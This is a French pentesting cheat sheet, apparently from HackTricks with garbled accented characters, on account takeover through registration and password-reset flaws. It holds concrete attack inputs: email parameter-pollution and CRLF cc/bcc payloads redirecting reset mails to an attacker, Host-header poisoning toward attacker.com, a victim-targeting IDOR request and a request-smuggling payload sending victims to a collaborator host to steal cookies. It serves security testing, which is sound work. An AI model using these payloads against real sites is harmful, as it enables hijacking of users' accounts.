# VulnÃ©rabilitÃ©s d'inscription et de prise de contrÃ´le

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Prise de contrÃ´le d'inscription

### Inscription en double

* Essayez de gÃ©nÃ©rer en utilisant un nom d'utilisateur existant
* VÃ©rifiez en variant l'e-mail :
  * majuscules
  * \+1@
  * ajouter quelque chose dans l'e-mail
  * caractÃ¨res spÃ©ciaux dans le nom de l'e-mail (%00, %09, %20)
  * Mettre des caractÃ¨res noirs aprÃ¨s l'e-mail : `test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### Ã‰numÃ©ration des noms d'utilisateur

VÃ©rifiez si vous pouvez dÃ©terminer quand un nom d'utilisateur a dÃ©jÃ  Ã©tÃ© enregistrÃ© dans l'application.

### Politique de mot de passe

En crÃ©ant un utilisateur, vÃ©rifiez la politique de mot de passe (vÃ©rifiez si vous pouvez utiliser des mots de passe faibles).\
Dans ce cas, vous pouvez essayer de forcer les informations d'identification.

### Injection SQL

[**Consultez cette page**](sql-injection/#insert-statement) pour apprendre comment tenter des prises de contrÃ´le de compte ou extraire des informations via des **injections SQL** dans les formulaires d'inscription.

### Prises de contrÃ´le Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### VulnÃ©rabilitÃ©s SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Changer l'e-mail

lorsque vous Ãªtes enregistrÃ©, essayez de changer l'e-mail et vÃ©rifiez si cette modification est correctement validÃ©e ou si vous pouvez la changer en e-mails arbitraires.

### Plus de vÃ©rifications

* VÃ©rifiez si vous pouvez utiliser des e-mails **jetables**
* **Long** **mot de passe** (>200) conduit Ã  une **DoS**
* **VÃ©rifiez les limites de taux de crÃ©ation de compte**
* Utilisez username@**burp\_collab**.net et analysez le **callback**

## **Prise de contrÃ´le de rÃ©initialisation de mot de passe**

### Fuite de jeton de rÃ©initialisation de mot de passe via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Demandez une rÃ©initialisation de mot de passe Ã  votre adresse e-mail
2. Cliquez sur le lien de rÃ©initialisation de mot de passe
3. Ne changez pas le mot de passe
4. Cliquez sur n'importe quel site tiers (par exemple : Facebook, Twitter)
5. Interceptez la demande dans le proxy Burp Suite
6. VÃ©rifiez si l'en-tÃªte referer fuit le jeton de rÃ©initialisation de mot de passe.

### Poisoning de rÃ©initialisation de mot de passe <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Interceptez la demande de rÃ©initialisation de mot de passe dans Burp Suite
2. Ajoutez ou modifiez les en-tÃªtes suivants dans Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Transmettez la demande avec l'en-tÃªte modifiÃ©\
   `http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Recherchez une URL de rÃ©initialisation de mot de passe basÃ©e sur l'en-tÃªte _host_ comme : `https://attacker.com/reset-password.php?token=TOKEN`

### RÃ©initialisation de mot de passe via le paramÃ¨tre e-mail <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR sur les paramÃ¨tres API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaquant doit se connecter avec son compte et accÃ©der Ã  la fonctionnalitÃ© **Changer de mot de passe**.
2. DÃ©marrer Burp Suite et intercepter la requÃªte.
3. Envoyer la requÃªte Ã  l'onglet Repeater et modifier les paramÃ¨tres : ID utilisateur/email\
   `powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Jeton de rÃ©initialisation de mot de passe faible <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Le jeton de rÃ©initialisation de mot de passe doit Ãªtre gÃ©nÃ©rÃ© de maniÃ¨re alÃ©atoire et unique Ã  chaque fois.\
Essayez de dÃ©terminer si le jeton expire ou s'il est toujours le mÃªme, dans certains cas, l'algorithme de gÃ©nÃ©ration est faible et peut Ãªtre devinÃ©. Les variables suivantes peuvent Ãªtre utilisÃ©es par l'algorithme.

* Horodatage
* ID utilisateur
* Adresse e-mail de l'utilisateur
* PrÃ©nom et nom de famille
* Date de naissance
* Cryptographie
* Nombre seulement
* Petite sÃ©quence de jeton (caractÃ¨res entre \[A-Z,a-z,0-9])
* RÃ©utilisation de jeton
* Date d'expiration du jeton

### Fuite de jeton de rÃ©initialisation de mot de passe <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. DÃ©clenchez une demande de rÃ©initialisation de mot de passe en utilisant l'API/UI pour un e-mail spÃ©cifique, par exemple : test@mail.com
2. Inspectez la rÃ©ponse du serveur et recherchez `resetToken`
3. Ensuite, utilisez le jeton dans une URL comme `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### RÃ©initialisation de mot de passe via collision de nom d'utilisateur <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Inscrivez-vous sur le systÃ¨me avec un nom d'utilisateur identique Ã  celui de la victime, mais avec des espaces blancs insÃ©rÃ©s avant et/ou aprÃ¨s le nom d'utilisateur. par exemple : `"admin "`
2. Demandez une rÃ©initialisation de mot de passe avec votre nom d'utilisateur malveillant.
3. Utilisez le jeton envoyÃ© Ã  votre e-mail et rÃ©initialisez le mot de passe de la victime.
4. Connectez-vous au compte de la victime avec le nouveau mot de passe.

La plateforme CTFd Ã©tait vulnÃ©rable Ã  cette attaque.\
Voir : [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Prise de contrÃ´le de compte via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trouvez une XSS Ã  l'intÃ©rieur de l'application ou d'un sous-domaine si les cookies sont limitÃ©s au domaine parent : `*.domain.com`
2. Fuite du cookie de session actuel
3. Authentifiez-vous en tant qu'utilisateur en utilisant le cookie

### Prise de contrÃ´le de compte via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Utilisez **smuggler** pour dÃ©tecter le type de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. CrÃ©ez une requÃªte qui Ã©crasera `POST / HTTP/1.1` avec les donnÃ©es suivantes :\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` dans le but de rediriger les victimes vers burpcollab et de voler leurs cookies\
3\. La requÃªte finale pourrait ressembler Ã  la suivante
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Des rapports de Hackerone ont exploitÃ© cette faille\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Prise de contrÃ´le de compte via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CrÃ©er une charge utile pour le CSRF, par exemple : "Formulaire HTML avec une soumission automatique pour un changement de mot de passe"
2. Envoyer la charge utile

### Prise de contrÃ´le de compte via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token peut Ãªtre utilisÃ© pour authentifier un utilisateur.

* Modifier le JWT avec un autre ID utilisateur / e-mail
* VÃ©rifier la signature JWT faible

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## RÃ©fÃ©rences

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
